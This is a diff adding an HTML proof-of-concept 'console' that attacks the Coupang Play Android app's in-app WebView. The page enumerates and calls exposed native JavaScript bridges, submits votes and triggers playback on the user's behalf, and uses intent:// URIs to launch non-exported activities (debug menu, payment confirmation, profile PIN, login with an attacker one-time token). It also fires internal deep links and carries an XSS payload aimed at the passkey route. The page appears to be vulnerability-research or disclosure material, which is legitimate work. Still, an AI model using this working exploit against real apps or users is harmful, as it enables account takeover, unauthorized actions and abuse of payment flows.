@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Coupang Play — WebView PoC Console</title>
+<style>
+  :root{
+    --bg:#0b0f14; --card:#141b24; --line:#243040; --text:#e6edf3; --muted:#8aa0b4;
+    --accent:#3ea6ff; --danger:#ff5c5c; --warn:#ffb020; --ok:#38c172;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:14px/1.45 -apple-system,Segoe UI,Roboto,sans-serif;padding:14px}
+  h1{font-size:17px;margin:0 0 2px}
+  .sub{color:var(--muted);font-size:12px;margin:0 0 12px}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:12px;margin:0 0 12px}
+  .card h2{font-size:13px;margin:0 0 8px;color:var(--accent);text-transform:uppercase;letter-spacing:.04em}
+  .card p.d{color:var(--muted);font-size:12px;margin:0 0 10px}
+  .grid{display:grid;grid-template-columns:1fr;gap:8px}
+  @media(min-width:520px){.grid{grid-template-columns:1fr 1fr}}
+  button{width:100%;text-align:left;background:#1b2husb;background:#1b2530;color:var(--text);border:1px solid var(--line);
+    border-radius:10px;padding:10px 12px;font-size:13px;cursor:pointer}
+  button:active{transform:scale(.99)}
+  button .t{display:block;font-weight:600}
+  button .s{display:block;color:var(--muted);font-size:11px;margin-top:2px;word-break:break-all}
+  button.danger{border-color:#5a2020} button.danger .t{color:var(--danger)}
+  button.warn{border-color:#5a4410} button.warn .t{color:var(--warn)}
+  input{width:100%;background:#0e141b;border:1px solid var(--line);color:var(--text);border-radius:8px;padding:8px;margin:6px 0;font-size:12px}
+  #log{background:#05080b;border:1px solid var(--line);border-radius:10px;padding:10px;font:12px/1.5 ui-monospace,Menlo,Consolas,monospace;
+    white-space:pre-wrap;word-break:break-all;max-height:38vh;overflow:auto;color:#bfe3ff}
+  .pill{display:inline-block;background:#0e141b;border:1px solid var(--line);border-radius:999px;padding:2px 8px;font-size:11px;color:var(--muted);margin:0 6px 6px 0}
+  .bar{display:flex;gap:8px;margin-bottom:8px}
+  .bar button{width:auto;padding:6px 10px}
+</style>
+</head>
+<body>
+<h1>Coupang Play — In-App WebView PoC Console</h1>
+<p class="sub">Load this inside the app's WebView:
+<code>coupangplay://web?url=https://YOUR-HTTPS-HOST/poc_console.html</code>
+(needs HTTPS — cleartext is blocked by the app's network-security config).</p>
+
+<div id="env" class="card">
+  <h2>1 · Environment / bridge probe</h2>
+  <p class="d">Confirms the page runs inside the privileged WebView and which native JS bridges are exposed to this (attacker) origin.</p>
+  <div id="envout"></div>
+</div>
+
+<div class="card">
+  <h2>2 · JS bridge → "CoupangPlay" (ec.d)</h2>
+  <p class="d">Input bridges reachable from any loaded origin. webviewCallback drives native navigation / token-consent refresh.</p>
+  <div class="grid">
+    <button onclick="call('CoupangPlay','webviewCallback', JSON.stringify({action:'OPEN_MATCH_PREDICTION',data:{quizId:'1'}}))">
+      <span class="t">webviewCallback → OPEN_MATCH_PREDICTION</span>
+      <span class="s">web content launches native MatchPredictionActivity</span></button>
+    <button onclick="call('CoupangPlay','webviewCallback', JSON.stringify({action:'CONSENT_UPDATE'}))">
+      <span class="t">webviewCallback → CONSENT_UPDATE</span>
+      <span class="s">forces token/consent refresh (c6().e)</span></button>
+    <button onclick="call('CoupangPlay','playCallback', JSON.stringify({data:JSON.stringify({id:'PoC',type:'clip'})}))">
+      <span class="t">playCallback(clip)</span>
+      <span class="s">web content drives native content playback</span></button>
+    <button onclick="call('CoupangPlay','voteCallback', JSON.stringify({voteId:'PoC',option:'A'}))">
+      <span class="t">voteCallback(vote)</span>
+      <span class="s">web content submits a vote on the user's behalf</span></button>
+  </div>
+</div>
+
+<div class="card">
+  <h2>3 · JS bridge → "playWebTrackingHandlers" (C6854c)</h2>
+  <p class="d">Second bridge attached to every page. Probe its methods (auto-enumerated below).</p>
+  <div id="trackout" class="grid"></div>
+</div>
+
+<div class="card">
+  <h2>4 · Launch NON-EXPORTED components (intent:// pivot)</h2>
+  <p class="d">The WebViewClient runs <code>Intent.parseUri()</code>+<code>startActivity()</code> with no component sanitization, so page navigation can start the app's own non-exported activities with attacker extras.</p>
+  <div class="grid">
+    <button class="danger" onclick="fireIntent('com.coupang.mobile.video.features.debugmenu.DebugMenuActivity')">
+      <span class="t">DebugMenuActivity</span><span class="s">internal debug menu (normally unreachable)</span></button>
+    <button class="danger" onclick="fireIntent('com.coupang.mobile.video.features.tvod.PaymentConfirmationActivity')">
+      <span class="t">PaymentConfirmationActivity</span><span class="s">TVOD payment confirmation screen</span></button>
+    <button class="warn" onclick="fireIntent('com.coupang.mobile.video.features.profile.ProfilePinActivity')">
+      <span class="t">ProfilePinActivity</span><span class="s">profile PIN screen</span></button>
+    <button class="warn" onclick="fireIntent('com.coupang.mobile.video.features.profile.ProfileActivity')">
+      <span class="t">ProfileActivity</span><span class="s">profile management</span></button>
+    <button onclick="fireIntent('com.coupang.mobile.video.features.login.LoginActivity',{ 'ott':'ATTACKER_OTT' })">
+      <span class="t">LoginActivity (+ott extra)</span><span class="s">pass attacker one-time-token extra</span></button>
+    <button class="danger" onclick="fireIntent('com.coupang.mobile.video.features.web.views.WebViewActivity',{ 'webview.encodeurl': wvChain() })">
+      <span class="t">WebViewActivity (+webview.encodeurl)</span><span class="s">chain a 2nd attacker WebView with arbitrary extras</span></button>
+    <button onclick="fireIntent('com.coupang.mobile.video.features.connectdevice.ConnectDeviceActivity')">
+      <span class="t">ConnectDeviceActivity</span><span class="s">device-connect / cast screen</span></button>
+    <button onclick="fireIntent('com.coupang.mobile.video.features.review.ReviewActivity')">
+      <span class="t">ReviewActivity</span><span class="s">review composer</span></button>
+    <button onclick="fireIntent('com.coupang.mobile.video.features.download.TicketDetailActivity')">
+      <span class="t">TicketDetailActivity</span><span class="s">download ticket detail</span></button>
+    <button onclick="fireIntent('com.coupang.mobile.video.features.music.detail.MusicDetailActivity')">
+      <span class="t">MusicDetailActivity</span><span class="s">music detail screen</span></button>
+    <button onclick="fireIntent('com.coupang.playdesignlibrary.examples.PlayDesignExampleActivity')">
+      <span class="t">PlayDesignExampleActivity</span><span class="s">internal design-system demo activity</span></button>
+    <button onclick="customIntent()">
+      <span class="t">Custom component…</span><span class="s">type any class + extras</span></button>
+  </div>
+  <input id="cc" placeholder="com.coupang.mobile.video.features.…Activity">
+  <input id="ce" placeholder="extras JSON e.g. {&quot;key&quot;:&quot;val&quot;}">
+</div>
+
+<div class="card">
+  <h2>5 · Fire internal coupangplay:// deep links (handlePlayScheme)</h2>
+  <p class="d">The WebViewClient executes app deep links requested by the page — attacker web content can drive any in-app route.</p>
+  <div class="grid">
+    <button onclick="go('coupangplay://web?url=https://example.com/chained')">
+      <span class="t">web?url= (chain another WebView)</span><span class="s">arbitrary URL again, from web content</span></button>
+    <button class="warn" onclick="go('coupangplay://parental')">
+      <span class="t">parental</span><span class="s">parental-controls route</span></button>
+    <button class="warn" onclick="go('coupangplay://home/wowsignup')">
+      <span class="t">home/wowsignup</span><span class="s">membership signup flow</span></button>
+    <button onclick="go('coupangplay://login?ott=ATTACKER_OTT')">
+      <span class="t">login?ott=</span><span class="s">one-time-token login route</span></button>
+    <button onclick="go('coupangplay://mypurchase')">
+      <span class="t">mypurchase</span><span class="s">purchases/tickets</span></button>
+    <button onclick="go('coupangplay://downloads')">
+      <span class="t">downloads</span><span class="s">downloads list</span></button>
+    <button class="danger" onclick="go(passkeyXss())">
+      <span class="t">passkey close (XSS payload)</span><span class="s">Finding B — fires in authenticated ctx only</span></button>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar">
+    <h2 style="flex:1">Log</h2>
+    <button onclick="document.getElementById('log').textContent=''">clear</button>
+  </div>
+  <div id="log"></div>
+</div>
+
+<script>
+  var L = document.getElementById('log');
+  function log(m){ L.textContent += m + "\n"; L.scrollTop = L.scrollHeight; }
+
+  // 1 · environment / bridge probe
+  (function(){
+    var out = document.getElementById('envout');
+    var origin = location.href;
+    var known = ['CoupangPlay','playWebTrackingHandlers'];
+    var found = [];
+    // enumerate window for injected java bridge objects
+    for (var k in window){ try{ if (window[k] && typeof window[k]==='object' && k[0]!=='_' && known.indexOf(k)>=0) found.push(k);}catch(e){} }
+    known.forEach(function(k){ if(found.indexOf(k)<0 && typeof window[k] !== 'undefined') found.push(k); });
+    var html = '<span class="pill">URL: '+origin+'</span>';
+    known.forEach(function(k){
+      var present = (typeof window[k] !== 'undefined');
+      html += '<span class="pill">'+k+': '+(present?'✅ exposed':'—')+'</span>';
+    });
+    out.innerHTML = html;
+    log('[env] origin = '+origin);
+    known.forEach(function(k){ log('[env] window.'+k+' = '+(typeof window[k])); });
+    // enumerate methods on the tracking bridge
+    var tb = document.getElementById('trackout');
+    if (typeof playWebTrackingHandlers !== 'undefined'){
+      var methods = [];
+      for (var m in playWebTrackingHandlers){ try{ if(typeof playWebTrackingHandlers[m]==='function') methods.push(m);}catch(e){} }
+      log('[env] playWebTrackingHandlers methods: '+JSON.stringify(methods));
+      if(methods.length===0) methods=['(no enumerable methods — call by known name)'];
+      methods.forEach(function(m){
+        var b=document.createElement('button');
+        b.innerHTML='<span class="t">'+m+'()</span><span class="s">probe tracking bridge</span>';
+        b.onclick=function(){ call('playWebTrackingHandlers',m,'{}'); };
+        tb.appendChild(b);
+      });
+    } else {
+      tb.innerHTML='<span class="pill">bridge not present in this context</span>';
+    }
+  })();
+
+  // 2/3 · call a JS bridge method, log outcome
+  function call(obj, method, arg){
+    try{
+      if(typeof window[obj]==='undefined'){ log('[bridge] '+obj+' NOT exposed here'); return; }
+      var r = window[obj][method](arg);
+      log('[bridge] '+obj+'.'+method+'('+(arg||'')+') => '+ (typeof r==='undefined'?'(void, native action invoked)':JSON.stringify(r)));
+    }catch(e){ log('[bridge] '+obj+'.'+method+' ERROR: '+e); }
+  }
+
+  // 4 · intent:// pivot to non-exported components
+  function esc(s){ return String(s).replace(/;/g,'%3B').replace(/=/g,'%3D').replace(/ /g,'%20'); }
+  function buildIntent(cls, extras){
+    var s = 'intent://poc#Intent;scheme=coupangplay;component=com.coupang.mobile.play/'+cls+';';
+    if(extras){ for(var k in extras){ s += 'S.'+k+'='+esc(extras[k])+';'; } }
+    s += 'end';
+    return s;
+  }
+  function fireIntent(cls, extras){
+    var uri = buildIntent(cls, extras);
+    log('[intent] launching non-exported: '+cls+(extras?'  extras='+JSON.stringify(extras):''));
+    log('         '+uri);
+    go(uri);
+  }
+  function wvChain(){ return 'https://example.com/second-attacker-webview'; }
+  function customIntent(){
+    var cls=document.getElementById('cc').value.trim(); if(!cls){log('[intent] enter a class');return;}
+    var ex=null; var raw=document.getElementById('ce').value.trim();
+    if(raw){ try{ex=JSON.parse(raw);}catch(e){log('[intent] bad extras JSON: '+e);return;} }
+    fireIntent(cls, ex);
+  }
+
+  // 5 · fire app deep links
+  function passkeyXss(){ return "coupangplay-passkey://closePasskeyRegister?result=" + encodeURIComponent("');alert('XSS-in:'+document.domain);//"); }
+  function go(uri){
+    log('[nav] '+uri);
+    // navigation triggers the app's WebViewClient.shouldOverrideUrlLoading
+    setTimeout(function(){ window.location.href = uri; }, 50);
+  }
+</script>
+</body>
+</html>
